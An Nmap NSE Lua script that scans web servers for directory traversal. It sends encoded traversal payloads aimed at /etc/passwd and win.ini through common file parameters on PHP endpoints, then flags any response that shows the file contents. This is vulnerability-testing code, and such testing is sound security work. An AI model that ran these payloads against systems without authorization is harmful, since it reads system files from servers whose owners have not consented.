-- Directory Traversal Detection
-- Tests for path traversal vulnerabilities

local http = require("http")
local stdnse = require("stdnse")

description = [[
Tests for directory traversal (path traversal) vulnerabilities
by sending various traversal payloads and analyzing responses.
]]

author = "Nemue Security Team"
license = "MIT"
categories = {"vuln", "intrusive", "exploit"}

portrule = function(host, port)
    return port.protocol == "tcp" and
           (port.service == "http" or port.service == "https" or
            port.number == 80 or port.number == 443 or
            port.number == 8080)
end

action = function(host, port)
    local output = {}
    local findings = {}

    local payloads = {
        "../../../../../../etc/passwd",
        "..\\..\\..\\..\\..\\..\\windows\\win.ini",
        "....//....//....//....//etc/passwd",
        "..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252f..%252fetc%252fpasswd",
    }

    local params = {"file", "path", "page", "include", "doc", "dir", "template", "load"}
    local test_paths = {"/index.php", "/view.php", "/download.php", "/include.php"}

    for _, test_path in ipairs(test_paths) do
        for _, param in ipairs(params) do
            for _, payload in ipairs(payloads) do
                local url = test_path .. "?" .. param .. "=" .. payload
                local r = http.get(host.ip, port, url)
                if r and r.body then
                    if r.body:find("root:%w*:0:0") or r.body:find("%[boot loader%]") or
                       r.body:find("daemon:") or r.body:find("%[fonts%]") then
                        table.insert(findings, {
                            url = url,
                            param = param,
                            payload = payload
                        })
                        break
                    end
                end
            end
            if #findings > 0 then break end
        end
        if #findings > 0 then break end
    end

    if #findings > 0 then
        table.insert(output, "Directory Traversal Vulnerabilities Found:")
        table.insert(output, "")
        for _, f in ipairs(findings) do
            table.insert(output, "[!] URL: " .. f.url)
            table.insert(output, "[!]   Parameter: " .. f.param)
            table.insert(output, "[!]   Payload: " .. f.payload)
            table.insert(output, "")
        end
        table.insert(output, "[!] CRITICAL: Allows reading arbitrary files")
        return stdnse.format_output(true, output)
    end

    return nil
end
